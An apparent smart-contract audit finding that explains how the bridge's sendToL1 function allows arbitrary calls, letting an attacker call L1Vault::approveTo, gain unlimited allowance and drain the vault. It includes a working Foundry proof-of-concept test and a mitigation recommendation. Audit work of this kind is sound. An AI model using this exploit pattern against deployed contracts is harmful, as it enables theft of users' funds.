### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.

The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes its `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

To reproduce, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    // An attacker deposits tokens to L2. We do this under the assumption that the
    // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    // Under the assumption that the bridge operator doesn't validate bytes being signed
    bytes memory message = abi.encode(
        address(vault), // target
        0, // value
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.
